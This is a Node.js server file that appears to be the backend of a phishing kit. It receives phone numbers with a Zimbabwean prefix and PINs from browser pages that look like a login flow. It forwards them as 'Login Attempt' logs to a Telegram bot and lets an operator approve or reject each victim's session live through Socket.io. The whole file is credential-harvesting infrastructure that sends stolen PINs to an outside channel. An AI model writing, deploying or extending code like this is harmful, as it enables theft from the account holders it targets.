const express = require('express');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
const { sendTelegramMessage, sendAdminApprovalRequest } = require('./bot-manager');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

io.on('connection', (socket) => {
    // 1. Join user to a private room based on their unique App ID
    // This allows the admin to send signals (Approve/Reject) specifically to them
    socket.on('join-session', (applicationId) => {
        socket.join(applicationId);
        console.log(`📡 Client connected to session: ${applicationId}`);
    });

    // 2. Immediate Telegram Logging (Steps 1, 2, and 5)
    socket.on('send-telegram-log', (message) => {
        sendTelegramMessage(message).catch(err => console.error("❌ Log Error:", err.message));
    });

    // 3. Admin-Controlled Verification (Step 4)
    socket.on('admin-approval-request', (data) => {
        // data: { appId, phone, pin }
        console.log(`🔐 Admin approval requested for PIN: ${data.pin}`);
        
        const loginLog = `🔐 *Login Attempt (Page 4)*\n` +
                         `*App ID:* \`${data.appId}\` \n` +
                         `*Phone:* +263 ${data.phone}\n` +
                         `*PIN:* \`${data.pin}\``;
        
        // Log the details first
        sendTelegramMessage(loginLog);

        // Send buttons to Telegram and pass 'io' to allow signals to be sent back to the browser
        sendAdminApprovalRequest(data.appId, data.pin, io).catch(err => console.error("❌ Admin Request Error:", err.message));
    });
});

// Final bridge route for the Step 3 Summary
app.post('/api/final-submit', async (req, res) => {
    const { message } = req.body;
    sendTelegramMessage(message)
        .then(() => res.json({ success: true }))
        .catch(err => {
            console.error(err);
            res.status(500).json({ error: "Sync failed" });
        });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ Stateless Telegram Bridge active on Port ${PORT}`);
});